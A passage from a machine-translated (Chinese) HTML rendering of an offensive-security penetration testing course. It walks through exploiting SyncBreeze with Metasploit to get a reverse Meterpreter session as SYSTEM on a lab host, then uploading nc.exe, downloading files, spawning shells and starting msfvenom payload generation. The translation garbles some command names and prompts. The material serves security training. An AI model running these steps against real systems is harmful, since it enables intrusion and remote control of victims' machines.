<div style="position:absolute;top:91017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们针对 Syncbreeze 尝试此有效负载。</font><font style="vertical-align: inherit;">正确配置一切后，我们可以启动</font></font></nobr></div>
<div style="position:absolute;top:91037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用并建立反向 Meterpreter 连接：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:91071;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/http/syncbreeze_bof）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用</font></font></font></b></nobr></div>
<div style="position:absolute;top:91105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 http://10.11.0.4:4444 上启动 HTTP 反向处理程序</font></font></nobr></div>
<div style="position:absolute;top:91122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 自动检测目标...</font></font></nobr></div>
<div style="position:absolute;top:91139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 目标是 10.0.28</font></font></nobr></div>
<div style="position:absolute;top:91156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 发送请求...</font></font></nobr></div>
<div style="position:absolute;top:91173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] http://10.11.0.4:4444 处理来自 10.11.0.22 的请求；</font><font style="vertical-align: inherit;">(UUID: ppowchzb) 分期 x</font></font></nobr></div>
<div style="position:absolute;top:91190;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter 会话 1 打开</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(10.11.0.4:4444 -&gt; 10.11.0.22:50270)</font></font></nobr></div>
<div style="position:absolute;top:91224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仪表盘 &gt; </font></font></nobr></div>
<div style="position:absolute;top:91244;left:290"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 767 - 建立反向 Meterpreter 连接</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:91273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如图所示，meterpreter 有效载荷的语法与我们拥有的其他有效载荷的语法相匹配</font></font></nobr></div>
<div style="position:absolute;top:91292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">看到了。</font><font style="vertical-align: inherit;">让我们更深入地研究 Meterpreter，以突出与</font></font></nobr></div>
<div style="position:absolute;top:91312;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准有效载荷。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:91346;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3.3</font></font></i></nobr></div>
<div style="position:absolute;top:91346;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Meterpreter 进行试验</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:91384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">help</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">检索 Meterpreter 内置的所有模块和命令的列表</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:91651;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="78"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 78 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:91684;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:92761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:92761;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:92761;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">695</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:91774;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3.3.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:91795;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帮助</font></font></font></b></nobr></div>
<div style="position:absolute;top:91829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">核心命令</font></font></nobr></div>
<div style="position:absolute;top:91846;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==============</font></font></nobr></div>
<div style="position:absolute;top:91880;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令    </font></font></nobr></div>
<div style="position:absolute;top:91880;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述</font></font></nobr></div>
<div style="position:absolute;top:91897;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------    </font></font></nobr></div>
<div style="position:absolute;top:91897;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------</font></font></nobr></div>
<div style="position:absolute;top:91914;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">?    </font></font></nobr></div>
<div style="position:absolute;top:91914;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帮助菜单</font></font></nobr></div>
<div style="position:absolute;top:91931;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">背景    </font></font></nobr></div>
<div style="position:absolute;top:91931;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">背景当前会话</font></font></nobr></div>
<div style="position:absolute;top:91948;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杀戮    </font></font></nobr></div>
<div style="position:absolute;top:91948;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杀死后台meterpreter脚本</font></font></nobr></div>
<div style="position:absolute;top:91965;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列表    </font></font></nobr></div>
<div style="position:absolute;top:91965;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列出正在运行的后台脚本</font></font></nobr></div>
<div style="position:absolute;top:91982;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格伦    </font></font></nobr></div>
<div style="position:absolute;top:91982;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行一个meterpreter脚本作为后台线程</font></font></nobr></div>
<div style="position:absolute;top:91999;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渠道    </font></font></nobr></div>
<div style="position:absolute;top:91999;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示信息或控制活动通道</font></font></nobr></div>
<div style="position:absolute;top:92016;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关闭    </font></font></nobr></div>
<div style="position:absolute;top:92016;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关闭频道</font></font></nobr></div>
<div style="position:absolute;top:92033;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">disable_unicode_encoding 禁用 unicode 字符串的编码</font></font></nobr></div>
<div style="position:absolute;top:92050;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">enable_unicode_encoding 启用 unicode 字符串的编码</font></font></nobr></div>
<div style="position:absolute;top:92067;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出口    </font></font></nobr></div>
<div style="position:absolute;top:92067;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">终止meterpreter会话</font></font></nobr></div>
<div style="position:absolute;top:92084;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取超时    </font></font></nobr></div>
<div style="position:absolute;top:92084;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取当前会话超时值</font></font></nobr></div>
<div style="position:absolute;top:92101;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">向导    </font></font></nobr></div>
<div style="position:absolute;top:92101;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取会话 GUID</font></font></nobr></div>
<div style="position:absolute;top:92118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.....</font></font></nobr></div>
<div style="position:absolute;top:92137;left:333"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 768 - Meterpreter 的帮助命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:92166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解 Meterpreter 功能的最佳方法是对其进行测试。</font><font style="vertical-align: inherit;">让我们从几个开始</font></font></nobr></div>
<div style="position:absolute;top:92186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">简单的命令，例如</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sysinfo</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">getuid</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:92221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sysinfo</font></font></font></b></nobr></div>
<div style="position:absolute;top:92238;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">电脑    </font></font></nobr></div>
<div style="position:absolute;top:92238;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: CLIENT251</font></font></nobr></div>
<div style="position:absolute;top:92255;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统    </font></font></nobr></div>
<div style="position:absolute;top:92255;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：Windows 10（内部版本 16299）。</font></font></nobr></div>
<div style="position:absolute;top:92272;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">架构：x86</font></font></nobr></div>
<div style="position:absolute;top:92289;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统语言：en_US</font></font></nobr></div>
<div style="position:absolute;top:92305;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域    </font></font></nobr></div>
<div style="position:absolute;top:92305;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 公司</font></font></nobr></div>
<div style="position:absolute;top:92322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录用户数：7</font></font></nobr></div>
<div style="position:absolute;top:92340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter : x86/windows</font></font></nobr></div>
<div style="position:absolute;top:92374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">getuid</font></font></font></b></nobr></div>
<div style="position:absolute;top:92390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器用户名：NT AUTHORITY\SYSTEM</font></font></nobr></div>
<div style="position:absolute;top:92410;left:297"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 769 - 在 meterpreter 中执行简单的命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:92439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 769 中发出的命令为我们提供了有关目标计算机的信息，</font></font></nobr></div>
<div style="position:absolute;top:92459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统和当前用户。</font></font></nobr></div>
<div style="position:absolute;top:92491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，让我们尝试使用内置的 Meterpreter 命令进行一些上传和下载。</font><font style="vertical-align: inherit;">请注意，</font></font></nobr></div>
<div style="position:absolute;top:92511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于 shell 转义，我们必须使用两个“\”字符作为目标路径，如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:92546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上传 /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec</font></font></font></b></nobr></div>
<div style="position:absolute;top:92563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 上传：/usr/share/windows-resources/binaries/nc.exe -&gt; c:\Users\Offsec</font></font></nobr></div>
<div style="position:absolute;top:92579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 上传：/usr/share/windows-resources/binaries/nc.exe -&gt; c:\Users\Offsec\nc.exe</font></font></nobr></div>
<div style="position:absolute;top:92613;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载 c:\\Windows\\system32\\calc.exe /tmp/calc.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:92631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 下载：c:\Windows\system32\calc.exe -&gt; /tmp/calc.exe</font></font></nobr></div>
<div style="position:absolute;top:92647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 下载 25.50 KiB (100.0%): c:\Windows\system32\calc.exe -&gt; /tmp/calc.exe</font></font></nobr></div>
<div style="position:absolute;top:92664;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 下载：c:\Windows\system32\calc.exe -&gt; /tmp/calc.exe</font></font></nobr></div>
<div style="position:absolute;top:92681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仪表盘 &gt; </font></font></nobr></div>
<div style="position:absolute;top:92700;left:279"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 770 - 使用 Meterpreter 上传和下载文件 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:92839;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="79"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 79 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:92872;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:93949;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:93949;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:93949;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">696</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:92968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter 包括基本的文件系统命令，例如</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pwd</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来导航</font></font></nobr></div>
<div style="position:absolute;top:92987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标文件系统。</font><font style="vertical-align: inherit;">尽管这些命令的命名与 Linux 上使用的命令相同，但它们</font></font></nobr></div>
<div style="position:absolute;top:93006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也可以在 Windows 主机上工作（通过 Meterpreter）。</font><font style="vertical-align: inherit;">产卵的最大优势</font></font></nobr></div>
<div style="position:absolute;top:93026;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter 中的系统 shell 是，如果由于某种原因，我们的 shell 应该死（例如，我们发出</font></font></nobr></div>
<div style="position:absolute;top:93045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shell 中的一个交互式命令，它不会超时），我们可以退出 shell 返回到</font></font></nobr></div>
<div style="position:absolute;top:93065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter 会话并在新通道中重新生成一个 shell，如清单 771 所示</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:93099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳</font></font></font></b></nobr></div>
<div style="position:absolute;top:93116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程 3488 已创建。</font></font></nobr></div>
<div style="position:absolute;top:93133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频道 3 已创建。</font></font></nobr></div>
<div style="position:absolute;top:93167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ftp 127.0.0.1</font></font></font></b></nobr></div>
<div style="position:absolute;top:93184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FTP 127.0.0.1</font></font></nobr></div>
<div style="position:absolute;top:93201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt; ftp: 连接 : 连接被拒绝</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:93218;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">^C</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:93252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">终止通道 3？</font><font style="vertical-align: inherit;">[Y / N]   </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ÿ</font></font></font></b></nobr></div>
<div style="position:absolute;top:93286;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳</font></font></font></b></nobr></div>
<div style="position:absolute;top:93303;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程 3504 创建。</font></font></nobr></div>
<div style="position:absolute;top:93320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频道 4 已创建。</font></font></nobr></div>
<div style="position:absolute;top:93354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出</font></font></font></b></nobr></div>
<div style="position:absolute;top:93371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出口</font></font></nobr></div>
<div style="position:absolute;top:93388;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仪表盘 &gt;</font></font></nobr></div>
<div style="position:absolute;top:93407;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 771 - 在 meterpreter 中使用 shell 命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:93437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然可以在用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">shell</font></font></b><font style="vertical-align: inherit;">打开的命令提示符中执行应用程序</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
<div style="position:absolute;top:93456;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，我们也可以使用内置的meterpreter命令。</font><font style="vertical-align: inherit;">例如，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行</font></font></font></b></nobr></div>
<div style="position:absolute;top:93475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令启动一个应用程序，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列出所有正在运行的进程，和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杀</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">终止定</font></font></nobr></div>
<div style="position:absolute;top:93495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过程。</font></font></nobr></div>
<div style="position:absolute;top:93528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然 Meterpreter 是 Metasploit 的签名负载并包含许多很棒的功能，但它并不是</font></font></nobr></div>
<div style="position:absolute;top:93547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只有有效载荷可用。</font><font style="vertical-align: inherit;">还有其他有效载荷在特定情况下具有用例，例如</font></font></nobr></div>
<div style="position:absolute;top:93566;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">vncinject/reverse_http，创建反向 VNC </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">713</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图形连接或 php/reverse_php，</font></font></nobr></div>
<div style="position:absolute;top:93586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是一个完全用 PHP 编写的反向 shell，可用于利用 PHP Web 应用程序。</font></font></nobr></div>
<div style="position:absolute;top:93605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还存在更多奇特的有效载荷，如大型机/reverse_shell_jcl，这是一个用于</font></font></nobr></div>
<div style="position:absolute;top:93624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Z/OS 大型机。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">714</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:93659;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3.3.2 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:93689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1) 花时间审查和试验 Metasploit 中可用的各种有效载荷。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:93723;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3.4</font></font></i></nobr></div>
<div style="position:absolute;top:93723;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可执行有效载荷</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:93761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit Framework 有效载荷也可以导出为各种文件类型和格式，例如</font></font></nobr></div>
<div style="position:absolute;top:93781;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如 ASP、VBScript、Jar、War、Windows DLL 和 EXE 等。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:93879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">713 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://en.wikipedia.org/wiki/Virtual_Network_Computing</font></font></font></nobr></div>
<div style="position:absolute;top:93899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">714 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://en.wikipedia.org/wiki/Z/OS</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:94027;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="80"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 80 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:94060;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:95137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:95137;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:95137;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">697</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:94156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，让我们使用 msfvenom </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">715</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实用程序生成原始的 Windows PE 反向外壳</font></font></nobr></div>
<div style="position:absolute;top:94175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可执行。</font><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志来设置有效载荷，设置</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LPORT</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来分配监听</font></font></nobr></div>
<div style="position:absolute;top:94195;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机和端口，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-f</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置输出格式（</font><font style="vertical-align: inherit;">在本例中为</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），- </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">o</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定输出文件名：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
